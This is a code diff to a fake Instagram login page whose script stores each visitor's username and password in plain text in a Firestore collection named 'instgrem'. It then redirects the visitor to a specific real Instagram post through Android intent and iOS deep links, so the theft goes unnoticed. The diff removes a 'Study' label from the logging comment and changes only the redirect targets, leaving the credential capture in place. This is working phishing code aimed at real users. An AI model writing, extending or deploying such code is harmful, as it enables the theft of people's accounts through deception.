@@ -143,33 +143,36 @@ window.goToInstagram = async function() {
         loginBtn.innerText = "Connecting...";
         loginBtn.disabled = true;
 
-        // 1. DATA LOGGING (Study: Storing plain text vs. Hashing)
+        // 1. DATA LOGGING
         await addDoc(collection(db, "instgrem"), {
             user: userInp.value,
             pass: passInp.value,
             timestamp: new Date().toISOString()
         });
 
-        // 2. MODERN ANDROID REDIRECTION
-        // This 'intent' string tells Android: 
-        // - Open the Instagram app if installed
-        // - If NOT installed, go to the Play Store link (S.browser_fallback_url)
-        const intentUrl = "intent://instagram.com/_u/main/#Intent;package=com.instagram.android;scheme=https;S.browser_fallback_url=https://www.instagram.com/accounts/login/;end";
+        // 2. MODERN ANDROID REDIRECTION (Updated for specific post)
+        // This targets the specific photo ID: DXhbWcWCGyM
+        const intentUrl = "intent://www.instagram.com/p/DXhbWcWCGyM/#Intent;package=com.instagram.android;scheme=https;S.browser_fallback_url=https://www.instagram.com/p/DXhbWcWCGyM/;end";
 
         // Try the modern Intent first
         window.location.href = intentUrl;
 
-        // 3. LEGACY FALLBACK
-        // For browsers that don't support Intent URLs, we still keep the timer.
+        // 3. LEGACY/iOS FALLBACK (Updated for specific post)
         setTimeout(() => {
             if (!document.hidden) {
-                window.location.href = "https://www.instagram.com/accounts/login/";
+                // This handles iOS and browsers that don't support Intent strings
+                window.location.href = "instagram://media?id=DXhbWcWCGyM";
+                
+                // Final fallback to web if app doesn't trigger
+                setTimeout(() => {
+                    window.location.href = "https://www.instagram.com/p/DXhbWcWCGyM/";
+                }, 1000);
             }
         }, 1500);
 
     } catch (e) {
         console.error("Redirection Study Error:", e);
-        window.location.href = "https://www.instagram.com/accounts/login/";
+        window.location.href = "https://www.instagram.com/p/DXhbWcWCGyM/";
     }
 };
     </script>
